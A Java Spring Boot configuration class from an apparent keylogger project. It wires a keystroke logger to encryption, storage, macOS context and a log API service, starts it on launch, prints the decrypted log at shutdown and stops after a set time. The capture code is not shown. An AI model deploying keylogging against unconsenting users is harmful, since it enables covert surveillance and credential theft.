package com.keyguard.javakeyguard.config;

import com.keyguard.javakeyguard.api.LogApiService;
import com.keyguard.javakeyguard.keylogger.KeyloggerRunner;
import com.keyguard.javakeyguard.keylogger.context.MacContextProvider;
import com.keyguard.javakeyguard.keylogger.encryption.EncryptionService;
import com.keyguard.javakeyguard.keylogger.reconstruction.ReconstructionService;
import com.keyguard.javakeyguard.keylogger.storage.LogStorageService;
import org.springframework.boot.CommandLineRunner;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

@Configuration
public class StartupConfig {

    @org.springframework.beans.factory.annotation.Value("${app.runtime.minutes:60}")
    private int runtimeMinutes;

    @Bean
    public KeyloggerRunner keyloggerRunner(
            EncryptionService encryptionService,
            ReconstructionService reconstructionService,
            LogStorageService logStorageService,
            MacContextProvider contextProvider,
            LogApiService logApiService) {

        return new KeyloggerRunner(
                encryptionService,
                reconstructionService,
                logStorageService,
                contextProvider,
                logApiService
        );
    }

    @Bean
    public CommandLineRunner runKeylogger(KeyloggerRunner keyloggerRunner) {
        return args -> keyloggerRunner.start();
    }

    @Bean
    public CommandLineRunner registerShutdownHook(KeyloggerRunner keyloggerRunner) {
        return args -> Runtime.getRuntime()
                .addShutdownHook(new Thread(keyloggerRunner::printFinalDecryptedLog));
    }

    @Bean
    public CommandLineRunner autoShutdownTimer() {
        return args -> {
            long delay = (long) runtimeMinutes * 60 * 1000;

            Thread timerThread = new Thread(() -> {
                try {
                    Thread.sleep(delay);
                    System.out.println("Scheduled shutdown triggered...");
                    System.exit(0);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                }
            });

            timerThread.setDaemon(false);
            timerThread.start();
        };
    }
}